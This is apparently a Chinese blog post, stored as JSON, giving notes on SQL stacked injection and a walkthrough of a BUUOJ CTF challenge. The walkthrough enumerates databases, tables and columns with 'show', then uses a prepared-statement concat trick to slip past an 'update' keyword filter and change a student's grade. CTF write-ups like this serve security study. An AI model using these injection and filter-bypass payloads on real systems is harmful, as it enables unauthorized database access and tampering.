{"title":"笔记/SQL堆叠注入","date":"2022-11-02T07:21:52.646Z","date_formatted":{"ll":"Nov 2, 2022","L":"11/02/2022","MM-DD":"11-02"},"link":"2022/11/02/笔记/SQL堆叠注入","updated":"2022-11-02T08:10:10.149Z","content":"<h2 id=\"1.堆叠注入\">1.堆叠注入<a title=\"#1.堆叠注入\" href=\"#1.堆叠注入\"></a></h2>\n<p>堆叠注入可以执行多条数据库语句<br>\n比如：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">username=1&#x27;;<span class=\"keyword\">show</span> <span class=\"keyword\">databases</span><span class=\"comment\">#</span></span><br></pre></td></tr></table></figure>\n<p>由于堆叠注入的特点，我们可以使用<strong>预处理</strong>来绕过一些过滤的语句<br>\n比如update被过滤了，我们怎么修改小明的英语成绩呢？下面的语句可以参考：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">username=1&#x27;;<span class=\"keyword\">set</span> @<span class=\"keyword\">sql</span>=<span class=\"keyword\">concat</span>(<span class=\"string\">&#x27;up&#x27;</span>,<span class=\"string\">&#x27;date score set english=100 where username=&quot;小明&quot;&#x27;</span>);<span class=\"keyword\">prepare</span> sql_exe <span class=\"keyword\">from</span> @<span class=\"keyword\">sql</span>; <span class=\"keyword\">execute</span> sql_exe<span class=\"comment\">#</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"2.题目\">2.题目<a title=\"#2.题目\" href=\"#2.题目\"></a></h2>\n<p>来源：<a href=\"https://buuoj.cn/match/matches/146/challenges\" target=\"_blank\">https://buuoj.cn/match/matches/146/challenges</a>  multiSQL</p>\n<p>题目已经暗示是堆叠注入</p>\n<p><img src=\"/2022/11/02/%E7%AC%94%E8%AE%B0/SQL%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/image-20221102154942778.png\" alt=\"image-20221102154942778\" loading=\"lazy\" class=\"φbp\"></p>\n<p>结合题目，要求让火华的英语成绩及格，可以想到可能要用update来修改火华的英语成绩<br>\n<img src=\"/2022/11/02/%E7%AC%94%E8%AE%B0/SQL%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/image-20221102155148722.png\" alt=\"image-20221102155148722\" loading=\"lazy\"></p>\n<p>使用堆叠注入，查看数据库</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1&#x27; ;<span class=\"keyword\">show</span> <span class=\"keyword\">databases</span><span class=\"comment\">#</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"/2022/11/02/%E7%AC%94%E8%AE%B0/SQL%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/image-20221102155314582.png\" alt=\"image-20221102155314582\" loading=\"lazy\" class=\"φbp\"></p>\n<p>接着直接按照惯例往下走，会发现select被过滤了，可以用show代替，</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1&#x27;;<span class=\"keyword\">show</span> <span class=\"keyword\">tables</span> <span class=\"keyword\">from</span> english<span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"number\">1</span><span class=\"string\">&#x27;;show columns from score#</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"/2022/11/02/%E7%AC%94%E8%AE%B0/SQL%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/image-20221102155933642.png\" alt=\"image-20221102155933642\" loading=\"lazy\" class=\"φbp\"></p>\n<p>把听力给修改了</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1’;<span class=\"keyword\">update</span> score ste listen=<span class=\"number\">666</span> <span class=\"keyword\">where</span> username=<span class=\"string\">&quot;火华&quot;</span><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\">--但会发现update被过滤了，所以使用预处理</span></span><br><span class=\"line\"><span class=\"number\">1</span><span class=\"string\">&#x27;;set @sql=concat(&#x27;</span>up<span class=\"string\">&#x27;,&#x27;</span><span class=\"built_in\">date</span> score <span class=\"keyword\">set</span> listen=<span class=\"number\">666</span> <span class=\"keyword\">where</span> username=<span class=\"string\">&quot;火华&quot;</span><span class=\"string\">&#x27;);prepare sql_exe from @sql;execute sql_exe#</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br></pre></td></tr></table></figure>\n<p>修改完成后，在查询一下火华的成绩，发现改变了，点击检查，就可发现flag。</p>\n","next":{"title":"墨茶Official","link":"2021/01/24/magicworld/墨茶"},"plink":"http://example.com/2022/11/02/笔记/SQL堆叠注入/","toc":[{"id":"1.堆叠注入","title":"1.堆叠注入","index":"1"},{"id":"2.题目","title":"2.题目","index":"2"}]}